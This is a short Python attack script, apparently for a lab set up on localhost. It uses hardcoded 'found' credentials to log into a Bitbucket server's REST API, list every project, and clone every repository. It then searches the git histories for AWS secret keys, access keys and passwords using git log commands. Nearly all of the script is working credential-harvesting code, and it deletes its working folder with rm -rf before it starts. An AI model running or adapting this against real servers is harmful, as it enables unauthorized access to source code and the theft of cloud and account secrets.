import requests
import json

# suppose we find some hardcoded credentials

username = 'super-taylor'
password = "z&eP$~9~GeXE'XU"
protocol = 'http'
domain = 'localhost:7990'

# first we get all the projects

url_base = f"{protocol}://{username}:{password}@{domain}"

repos_url = f'{url_base}/rest/api/1.0/projects'

res = requests.get(repos_url)
data = res.json()
print(json.dumps(data, indent=2))

project_keys = [x["key"] for x in data["values"]]
print(project_keys)

# then we walk through the projects and 
repo_links = []
for pkey in project_keys:
    url = f"{url_base}/rest/api/1.0/projects/{pkey}/repos"
    res = requests.get(url)
    data = res.json()
    print(json.dumps(data, indent=2))
    project_repo_links = [x["links"]["clone"][0]["href"] for x in data["values"]]
    repo_links.extend(project_repo_links)

print(repo_links)

# useful git log commands to search through repos
git_secret_aws = 'git log -S AWS_SECRET_ACCESS_KEY --pretty=short -p | grep AWS_SECRET_ACCESS_KEY'
git_aws_keys = 'git log -S AWS_ACCESS_KEY --pretty=short -p | grep AWS_ACCESS_KEY'
git_password = 'git log -S password --pretty=short -p | grep password'
git_bitbucket_domain = 'git log -S bitbucket.com --pretty=short -p | grep bitbucket.com'

import os

try:
    os.system('rm -rf repos')
    os.mkdir('repos')
    os.chdir('repos')

except Exception as ex:
    print(ex)


for repo in repo_links:
    repo_suffix = repo.split('/scm/')[1]
    clone_cmd = f'git clone "{url_base}/scm/{repo_suffix}"'
    print(clone_cmd)
    os.system(clone_cmd)
    repo_name = repo_suffix.split('/')[-1].split('.git')[0]
    os.chdir(repo_name)
    os.system(git_bitbucket_domain)
    os.chdir('..')

